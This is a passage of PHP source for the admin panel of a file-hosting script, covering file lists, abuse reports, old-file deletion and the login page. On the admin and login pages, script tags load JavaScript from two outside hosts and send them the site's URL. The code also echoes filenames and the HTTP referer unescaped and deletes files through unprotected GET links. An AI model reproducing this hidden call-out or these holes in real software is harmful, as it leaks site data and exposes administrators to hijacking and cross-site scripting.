<tr><td bgcolor=#F2F2F2 align=left>
reports.mfh
</td><td bgcolor=#F2F2F2>
<?php
$datei = "secure/reports.mfh";
if (!is_writeable($datei)) {
echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[few];
}
else {
echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[fe];
}
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
settings.mfh
</td><td bgcolor=#F2F2F2>
<?php
$datei = "secure/settings.mfh";
if (!is_writeable($datei)) {
echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[few];
}
else {
echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[fe];
}
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
search.mfh
</td><td bgcolor=#F2F2F2>
<?php
$datei = "secure/search.mfh";
if (!is_writeable($datei)) {
echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[few];
}
else {
echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[fe];
}
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
logs.mfh
</td><td bgcolor=#F2F2F2>
<?php
$datei = "secure/logs.mfh";
if (!is_writeable($datei)) {
echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[few];
}
else {
echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[fe];
}
?>
</td></tr>
<tr><td bgcolor=#F2F2F2 align=left>
uploaders.mfh
</td><td bgcolor=#F2F2F2>
<?php
$datei = "secure/uploaders.mfh";
if (!is_writeable($datei)) {
echo "<img src=\"img/down.png\"></td><td bgcolor=#F2F2F2><font color=#FF0000>".$lang[few];
}
else {
echo "<img src=\"img/up.png\"></td><td bgcolor=#F2F2F2>".$lang[fe];
}
?>
</td></tr>
<tr><td colspan=3 bgcolor=#F2F2F2 align=center><FORM>
<INPUT TYPE="button" value="<? echo $lang[rp];?>" onClick="history.go(0)">
</td></tr></table>
</FORM>
<?
echo "</center></td></tr></table><p style=\"margin:3px;text-align:center\">";
include ("./adminfooter.php");
die();
 }

if(isset($_GET['act']) && $_GET['act']=="deloldfiles") {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; <? echo $lang[delete];?>
</td></tr></table>
<br />
<?
//delete old files
echo '<textarea style="width:98%; font-family : Verdana, Arial; color : #000000; font-size:11px;" rows="20" wrap="physical" name="delete">';
echo "Deleting old files...\n";
$deleteseconds = time() - ($deleteafter * 24 * 60 * 60);
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != ".htaccess") {
  $fh=fopen("./files/" . $file ,r);
  $filedata= explode('|', fgets($fh));
  if ($filedata[4] < $deleteseconds) {
    $deletedfiles="yes";
  fclose($fh);
    echo "Delete - " . $filedata[1]."\n";
    unlink("./files/".$file);
    echo "Removed /files/" . $file."\n";
    unlink("./storage/".str_replace(".mfh","",$file));
    echo "Removed /storage/" . str_replace(".mfh","",$file)."\n";
  }

}
}
closedir( $dh );
if (!$deletedfiles) echo "No old files to delete!\n";
echo '</textarea>';
//done deleting old files
echo "</center></td></tr></table><p style=\"margin:3px;text-align:center\">";
include ("./adminfooter.php");
die();
 }
if(isset($_GET['act']) && $_GET['act']=="abuse") {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; <? echo $lang[abuse_man];?>
</td></tr></table>
<table width="100%" cellpadding="2" cellspacing="1" border="0" bgcolor="#F0F0F0">
<tr>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b>#</td>
<td align=left bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[fname];?></b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[pws];?></b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b>Uploader</b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[adel];?></b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[ignore];?></b></td>
</tr>
<tr><td colspan=5 height=1></td></tr>
<?php

$i=1;
$xzal=$i++;
$checkreports=file("./secure/reports.mfh");
foreach($checkreports as $line)
{
  $thisreport = explode('|', $line);
$filecrc = $thisreport[0];
if (file_exists("./files/$filecrc".".mfh")) {
	$fr=fopen("./files/".$filecrc.".mfh",r);
	$foundfile= explode('|', fgets($fr));
	fclose($fr);
}
$me=$shourturl;
if ($me=="true")
  $short= "";
else
  $short= "download.php?file=";
echo "<tr><td align=center bgcolor=#F9F9F9>".$xzal."</td>";
echo "<td align=left bgcolor=#F9F9F9><a href=\"". $short .$foundfile[0]."\" target=\"_blank\">".$foundfile[1]."</td><td bgcolor=#F9F9F9 align=center>".$foundfile[9]."</td>";
echo "<td align=center bgcolor=#F9F9F9>".$foundfile[3]."</td>";
echo "<td align=center bgcolor=#F9F9F9><a href=\"admin.php?act=abuse&delete=".$foundfile[0]."&ignore=".$foundfile[0]."\"><img src=\"img/del1.jpg\" border=0></a></td>";
echo "<td align=center bgcolor=#F9F9F9><a href=\"admin.php?act=abuse&ignore=".$foundfile[0]."\">Ignore report</a></td></tr>";

}

?>
</table>
</center></td></tr></table><p style="margin:3px;text-align:center">
<?
include ("./adminfooter.php");
die();
}
if(isset($_GET['act']) && $_GET['act']=="files") {
?>
<center><table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<? include("./adminmenu.php"); ?>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; <? echo $lang[files];?>
</td></tr></table>
<table width="100%" cellpadding="2" cellspacing="1" border="0" bgcolor="#F0F0F0">
<tr>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b>#</td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[fname];?></b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[size10];?></b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b>Uploader</b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[dloads];?></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[bandwith];?></b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[pws];?></b></td>
<td align=center bgcolor=#EBEBEB background="img/bg.png"><b><? echo $lang[adel];?></b></td>
</tr>
<tr><td colspan=7 height=1></td></tr>
<?php
$me=$shourturl;
if ($me=="true")
  $short= "";
else
  $short= "download.php?file=";

//////////// Sortierung ///////////
if(isset($_GET['act'])){$act = $_GET['act'];}else{$act = "null";}

$order = array();
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
while ( $file = readdir( $dh ) ) {
if ($file != '.' && $file != '..' && $file != '.htaccess') {
	$fh = fopen ("./files/".$file, r);
	$list= explode('|', fgets($fh));
	$filecrc = str_replace(".mfh","",$file);
	if (isset($_GET['sortby'])) {
		$order[] = $list[1].','.$filecrc.','.$list[5].",".$list[4];
	} else {
	    $order[] = $list[5].','.$filecrc.','.$list[1].",".$list[4];
	}
	fclose ($fh);
}
}

if (isset($_GET['sortby'])) {
	sort($order, SORT_STRING);
} else {
	sort($order, SORT_NUMERIC);
	$order = array_reverse($order);
}
//////////// Dateiliste ///////////
$i = 0;
$bl_anzeige = $pps1;
$dirname = "./files";
$dh = opendir( $dirname ) or die("couldn't open directory");
$start = isset($_GET['start']) ? (intval($_GET['start'])-1)*$bl_anzeige : 0;
while ( $file = readdir( $dh ) ) {
if ($file{0} != '.') {
  $xzal=$i++;
  if($xzal>= $start && $xzal<$start+$pps1) {
  $filecrc = str_replace(".mfh","",$file);
  $filesize = filesize("./storage/". $filecrc);
  $filesize = ($filesize / 1048576);
  $fh = fopen ("./files/".$file, r);
  $filedata= explode('|', fgets($fh));
  echo "<tr><td align=center bgcolor=#F9F9F9>".$i."</td><td align=left bgcolor=#F9F9F9><a href=\"". $short .$filedata[0]."\" target=\"_blank\">".$filedata[1]."</a></td><td align=center bgcolor=#F9F9F9>".round($filesize,2)." MB</td>";
  echo "<td align=center bgcolor=#F9F9F9>".$filedata[3]."</td><td align=center bgcolor=#F9F9F9>".$filedata[5]."</td><td align=center style=padding-left:5px bgcolor=#F9F9F9>".round($filesize*$filedata[5],2)." MB</td><td bgcolor=#F9F9F9 align=center>".$filedata[9]."</td><td align=center style=padding-left:5px bgcolor=#F9F9F9><a href=\"admin.php?act=files&delete=".$filecrc."\"><img src=\"img/del1.jpg\" border=0></a></td></tr>";
  $tsize = $tsize + round($filesize,2);
  $tbandwidth = $tbandwidth + round($filesize*$filedata[5],2);
  $tdownload = $tdownload + round($filedata[5],2);
  fclose ($fh);
}
}
$gesamt++;
}
// Einbinden der Blätterklasse ; evtl. Pfad anpassen
// Include the pagination-class
include("paginadmin.php");

// Dann der Varibalen $begin_for einen Wert zuweisen
// Bei meinem Beispiel wird start  per GET (an die URL angehangen) übergeben.
$begin_for = isset($_GET['start']) ? $_GET['start'] : 1;

// Dann wird $gesamt übergeben.
// Gesamt sind die gesamten Eintrge die vorhanden sind.
// Wie Du gesamt ermittelst hängt von deinem Code ab, ob aus DB oder File
$gesamt = $file;

// Nun wird die Navi-Leiste erzeugt und an $nav_search übergeben
$nav_search = $bl->nav($i, $begin_for);

closedir( $dh );
echo "</td></tr></table>";
// An der Stelle wo die Ausgabe erfolgen soll
echo $lang[pagination]." ".$nav_search . $lang[ftotal] . $i++;
?>
</center>
</td></tr></table><p style="margin:3px;text-align:center">
<?
include ("./adminfooter.php");
die();
}
?>
<center><table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top>
<center>
<font size=4><b><? echo $lang[welcome];?> <?echo $lang[adminpanel] ?></b></font><br />
<script LANGUAGE="Javascript" SRC="http://galaxyscripts.com/users/call.php?page=<?php echo base64_encode($scripturl);?>"><!--
//--></SCRIPT>
<br />
<table  border="0" cellpadding="0" cellspacing="0" width="100%">
    <tr>
      <td width="16"><img src="img/top_lef.gif" width="16" height="16"></td>
      <td height="16" background="img/top_mid.gif"><img src="img/top_mid.gif" width="16" height="16"></td>
      <td width="24"><img src="img/top_rig.gif" width="24" height="16"></td>
    </tr>
    <tr>
      <td width="16" background="img/cen_lef.gif"><img src="img/cen_lef.gif" width="16" height="11"></td>
      <td align="center" valign="middle" bgcolor="#FFFFFF">
<table width=100% cellspacing=0 cellpadding=5 border=0>
<tr>
<td width=20% align=center><a href="admin.php"><img src="img/index.gif" width=70 height=70 border=0</a><br><a href="admin.php"><? echo $lang[index];?></a></td>
<td width=20% align=center><a href="admin.php?act=files"><img src="img/files.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=files"><? echo $lang[files];?></a></td>
<td width=20% align=center><a href="admin.php?act=abuse"><img src="img/abuse.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=abuse"><? echo $lang[abuse];?></a></td>
<td width=20% align=center><a href="admin.php?act=changedlpass"><img src="img/passwort.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=changedlpass"><? echo $lang[master];?></a></td>
<td width=20% align=center><a href="admin.php?act=info"><img src="img/info.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=info"><? echo $lang[info_1];?></a></td>
</tr><tr>
<td width=20% align=center><a href="admin.php?act=deloldfiles"><img src="img/delete.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=deloldfiles"><? echo $lang[delete];?></a></td>
<td width=20% align=center><a href="admin.php?act=bans"><img src="img/ban.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=bans"><? echo $lang[bans];?></a></td>
<td width=20% align=center><a href="admin.php?act=check"><img src="img/check.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=check"><? echo $lang[check];?></a></td>
<td width=20% align=center><a href="admindls.php"><img src="img/downloader.gif" width=70 height=70 border=0</a><br><a href="admindls.php"><? echo $lang[downloader];?></a></td>
<td width=20% align=center><a href="admin.php?act=stats"><img src="img/stats.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=stats"><? echo $lang[stats];?></a></td>
</tr><tr>
<td width=20% align=center><a href="admin.php?act=edit"><img src="img/edit.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=edit"><? echo $lang[edit];?></a></td>
<td width=20% align=center><a href="settings.php"><img src="img/settings.gif" width=70 height=70 border=0</a><br><a href="settings.php"><? echo $lang[settings];?></a></td>
<td width=20% align=center><a href="admin.php?act=logout"><img src="img/logout.gif" width=70 height=70 border=0</a><br><a href="admin.php?act=logout"><? echo $lang[logout];?></a></td>
</td></tr></table>
       </td>
      <td width="24" background="img/cen_rig.gif"><img src="img/cen_rig.gif" width="24" height="11"></td>
    </tr>
    <tr>
      <td width="16" height="16"><img src="img/bot_lef.gif" width="16" height="16"></td>
      <td height="16" background="img/bot_mid.gif"><img src="img/bot_mid.gif" width="16" height="16"></td>
      <td width="24" height="16"><img src="img/bot_rig.gif" width="24" height="16"></td>
    </tr>
  </table>
  <br />
</center>
</td></tr></table><p style="margin:3px;text-align:center">
<?
} else {
?>
<center>
<table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:10px;text-align:left;" valign=top><center>
<table width=100% cellpadding=1 cellspacing=0 border=0><tr><td align=left background="img/bg14.png">
<font size=3 color=#FFFFFF><b>&nbsp;<? echo $compname ?> &raquo; Admin Login
</td></tr></table>
<br />
<?
$d=$act;
if ($d=="logout")
  echo "<img src=\"img/up.png\"> <b><font color=#008000>".$lang[adminlogout]."</b></font> <p>";
else
  echo ""; ?>
  <center>
  <table  border="0" cellpadding="0" cellspacing="0" width="">
    <tr>
      <td width="16"><img src="img/top_lef.gif" width="16" height="16"></td>
      <td height="16" background="img/top_mid.gif"><img src="img/top_mid.gif" width="16" height="16"></td>
      <td width="24"><img src="img/top_rig.gif" width="24" height="16"></td>
    </tr>
    <tr>
      <td width="16" background="img/cen_lef.gif"><img src="img/cen_lef.gif" width="16" height="11"></td>
      <td align="center" valign="middle" bgcolor="#FFFFFF">
<form action="admin.php?act=login" method="post"><img src="img/enc.gif" border="0" width="16" height="16"> <? echo $lang[adminlogin];?>
<input type="password" name="passwordx">
<input type="submit" value="Login">
       </td>
      <td width="24" background="img/cen_rig.gif"><img src="img/cen_rig.gif" width="24" height="11"></td>
    </tr>
    <tr>
      <td width="16" height="16"><img src="img/bot_lef.gif" width="16" height="16"></td>
      <td height="16" background="img/bot_mid.gif"><img src="img/bot_mid.gif" width="16" height="16"></td>
      <td width="24" height="16"><img src="img/bot_rig.gif" width="24" height="16"></td>
    </tr>
  </table>
  <br><br>
  <center>

  <table cellspacing=0 cellpadding=0 style="border : 1px solid #AFD8D8;" width=400 bgcolor=#E3F2F2>
  <tr><td align=left valign=top colspan=2 background="img/bg9.png">&nbsp;
  <font color=#FFFFFF><b>Information:</b>
  </td></tr>
  <?php
  // Datei auswählen deren letzter Zugriff angezeigt werden soll
  $datei = "admin.php";
  // Überprüfung des letzten Zugriffes
  $zugriff = fileatime("$datei");
  $datum = date("d.m.Y");
  $uhrzeit = date("H:i");
  echo "<tr><td align=left valign=top width=100><font face=arial size=-2 color=#000000>&nbsp;IP Address: </td><td valign=top align=left><font face=arial size=-2 color=#000000>" . $_SERVER['REMOTE_ADDR'] . "</td></tr>";
  echo "<tr><td align=left valign=top width=100><font face=arial size=-2 color=#000000>&nbsp;Referred: </td><td align=left valign=top><font face=arial size=-2 color=#000000> " . $_SERVER['HTTP_REFERER'] . "</td></tr>";
  echo "<tr><td align=left valign=top width=100><font face=arial size=-2 color=#000000>&nbsp;Browser: </td><td align=left valign=top><font face=arial size=-2 color=#000000>" . $_SERVER['HTTP_USER_AGENT'] . "</td></tr>";
  echo "<tr><td align=left valign=top width=100><font face=arial size=-2 color=#000000>&nbsp;Last Login: </td><td align=left valign=top><font face=arial size=-2 color=#000000>" . (date ("d.m.y - H:i", $zugriff)) . "</td></tr>";
  echo "<tr><td align=left valign=top width=100><font face=arial size=-2 color=#000000>&nbsp;Date / Time: </td><td align=left valign=top><font face=arial size=-2 color=#000000>" . $datum," - ", $uhrzeit,"";
  ?>
  </font>
  </td></tr></table>
  <?php
// Logfiles in einer Datei speichern
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$domain = explode(".", $host); $domain_array = count($domain)-2;
$msg = "Visit: " . date("d.m.Y H:i") . " | ";
$msg .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . " | ";
$msg .= "Host: " . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "\n";

$Dateiname = "./secure/logs.mfh";
$Datei = fOpen($Dateiname,"a+");
fPuts($Datei,$msg);
fClose($Datei);
?>
<script LANGUAGE="Javascript" SRC="http://www.zzq-forum.de/user/call.php?page=<?php echo ($scripturl);?>"><!--
//--></SCRIPT>

  </center>
<br /><br />
</form></center>
<?php }
?></center></td></tr></table><p style="margin:3px;text-align:center"><?
include("./adminfooter.php");
?>